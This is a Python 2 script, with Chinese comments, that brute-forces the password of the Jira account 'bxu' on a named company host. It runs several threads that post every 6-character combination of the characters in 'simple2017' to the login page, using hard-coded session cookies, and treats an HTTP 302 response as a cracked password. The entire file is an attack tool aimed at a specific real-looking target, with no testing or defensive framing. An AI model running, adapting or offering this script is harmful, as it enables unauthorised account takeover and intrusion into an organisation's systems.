# -*- coding: utf-8 -*-

import requests
import Queue
import itertools
import sys
import threading
import time

class Bruter(object):
    # characters为字符串，包含组成口令的所有字符
    # threads为线程个数，pwd_len为生成的测试口令的长度
    def __init__(self, user, characters, pwd_len, threads):
        self.user = user
        self.found = False
        self.threads = threads
        print '构建待测试口令队列中...'
        self.pwd_queue = Queue.Queue()
        
        ddd = itertools.product(list(characters), repeat=pwd_len)
        try:            
            for pwd in ddd:
                self.pwd_queue.put(''.join(pwd))
        except MemoryError as identifier:
            print(identifier)
        
        self.result = None
        print '构建成功!'

    def __login(self, user, pwd):
        url = 'http://jira.liquid-capital.liquidcap.com/login.jsp'
        values ={
            'os_username': user,
            'os_password': pwd,
            'os_destination':'',
            'user_role':'',
            'atl_token':'',
            'login':'Log+In'
        }
        my_cookie = {
            'atlassian.xsrf.token':'ACQ0-EPJ1-O4YC-38MI|3e41835ddde11b4211409f93f90ed9d4bd397802|lout',
            'JSESSIONID':'7C91F63D26E6C93A587184CC8F73A9CE'
        }
        r = requests.post(url, data=values, cookies=my_cookie)
        if r.status_code == 302:
            return True
        return False

    def __web_bruter(self):
        while not self.pwd_queue.empty() and not self.found:
            pwd_test = self.pwd_queue.get()
            if self.__login(self.user, pwd_test):
                self.found = True
                self.result = pwd_test
                print '破解 %s 成功，密码为: %s' % (self.user, pwd_test)
            else:
                self.found = False

    def brute(self):
        for i in range(self.threads):
            t = threading.Thread(target=self.__web_bruter)
            t.start()
            print '破解线程-->%s 启动' % t.ident

        while(not self.pwd_queue.empty()):
            sys.stdout.write('\r 进度: 还剩余%s个口令 (每1s刷新)' % self.pwd_queue.qsize())
            sys.stdout.flush()
            time.sleep(1)
        print '\n破解完毕'



if __name__ == '__main__':
    cracker = Bruter('bxu', 'simple2017', 6, 2)
    cracker.brute()